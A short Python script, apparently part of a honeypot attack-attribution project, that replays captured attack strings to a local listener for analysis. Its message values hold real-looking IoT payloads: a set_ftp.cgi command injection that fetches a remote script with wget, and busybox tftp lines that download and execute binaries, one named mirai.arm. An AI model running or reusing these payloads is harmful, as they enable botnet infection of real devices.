import datetime
import time
from multiprocessing.connection import Client
#from db_model import AttackAttribution

"""
sleep_ctr = 1
records = AttackAttribution.select().where(
    AttackAttribution.attack_info.contains('wget'),
    AttackAttribution.outbound_conn_attempt_time > datetime.datetime.strptime("2018-07-12 00:01:02","%Y-%m-%d %H:%M:%S")
)
for each_row in records:
    if sleep_ctr >= 1024:
        print "Sleeping for 5 sec"
        time.sleep(5)
        sleep_ctr = 1
    print each_row.attack_info
    # print type(each_row.outbound_conn_attempt_time)
    msg=[
        each_row.outbound_conn_attempt_time.strftime("%Y-%m-%d %H:%M:%S").replace(' ', '_').replace('-', '_').replace(':', '_'),
        each_row.attack_info
    ]
    address = ('localhost', 6000)
    conn = Client(address, authkey='YEa2AprvEd')
    conn.send(msg)
    conn.close()
    sleep_ctr += 1
"""

# wget payload
# msg=['2018_07_09_19_44_07', 'Timestamps,GET /set_ftp.cgi?loginuse=admin&loginpas=888888&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28echo+-e+"wget+http:/\/80.211.84.76/gg"+>>+/tmp/sdf%29 HTTP/1.1\n,\n']
msg=['2020_08_14_18_00_04', 'rm .s; tftp -l.i -r.i -g 183.105.104.226:16245; chmod 777 .i; ./.i; exit\r']
#msg=['2020_08_21_09_46_35', 'Timestamps,GET /set_ftp.cgi?loginuse=admin&loginpas=888888&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28echo+-e+"wget+http:/\\/91.212.150.241/go.sh"+>>+/tmp/sdy%29 HTTP/1.1\\n,\\n']
#msg=['2020_08_21_12_46_03', '/bin/busybox tftp -g -l fCkx6Ka70a -r arm_Skyline 95.213.243.69; /bin/busybox chmod 777 fCkx6Ka70a; /bin/busybox Skyline\r']
address = ('localhost', 6000)
conn = Client(address, authkey='YEa2AprvEd')
conn.send(msg)
conn.close()

# print 'Sleeping for 10 seconds'
time.sleep(10)

#tftp payload
#msg=['2017_09_18_06_31_56','/bin/busybox tftp -g -l dvrkelper -r mirai.arm 51.15.223.126; /bin/busybox chmod 777 dvrkelper; /bin/busybox ECCHI']
#msg=['2020_08_14_15_32_01', 'rm .s; tftp -l.i -r.i -g 60.250.246.222:64906; exit\r']
#msg=['2020_08_14_16_31_16', 'Timestamps,GET /set_ftp.cgi?loginuse=admin&loginpas=888888&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28echo+-e+"wget+http:/\\/91.212.150.241/go.sh"+>>+/tmp/sdy%29 HTTP/1.1\\n,\\n']
#address = ('localhost', 6000)
#conn = Client(address, authkey='YEa2AprvEd')
#conn.send(msg)
#conn.close()

print("Done...")